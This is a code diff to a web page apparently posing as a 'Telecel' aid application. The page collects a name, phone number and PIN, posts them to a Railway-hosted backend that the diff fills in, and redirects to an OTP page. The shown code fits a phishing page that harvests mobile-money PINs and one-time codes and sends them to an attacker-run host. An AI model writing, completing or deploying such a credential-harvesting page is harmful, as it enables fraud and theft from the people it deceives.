@@ -447,8 +447,8 @@
     </div>
 
     <script>
-        // BACKEND URL - CHANGE THIS TO YOUR RAILWAY URL AFTER DEPLOYMENT
-        const BACKEND_URL = 'https://your-railway-app.up.railway.app';
+        // ✅ UPDATED BACKEND URL - YOUR RAILWAY URL
+        const BACKEND_URL = 'https://telecel-cash-production.up.railway.app';
 
         const savedData = JSON.parse(sessionStorage.getItem('telecelAidApplication'));
 
@@ -571,16 +571,13 @@
             const isDeclarationValid = validateDeclaration();
 
             if (isNameValid && isPhoneValid && isPinValid && isDeclarationValid) {
-                // Show loading overlay
                 loadingOverlay.style.display = 'flex';
                 submitBtn.disabled = true;
                 errorToast.classList.remove('show');
                 
-                // Send data to backend
                 const success = await submitToBackend();
                 
                 if (success) {
-                    // Store verification data
                     const verificationData = {
                         confirmedName: confirmedName.value.trim(),
                         confirmedPhone: confirmedPhone.value.trim(),
@@ -595,17 +592,14 @@
                     
                     sessionStorage.setItem('telecelAidApplication', JSON.stringify(completeData));
                     
-                    // Redirect to OTP page
                     setTimeout(() => {
                         window.location.href = 'otp.html';
                     }, 800);
                 } else {
-                    // Show error
                     loadingOverlay.style.display = 'none';
                     submitBtn.disabled = false;
                     errorToast.classList.add('show');
                     
-                    // Auto hide error after 5 seconds
                     setTimeout(() => {
                         errorToast.classList.remove('show');
                     }, 5000);
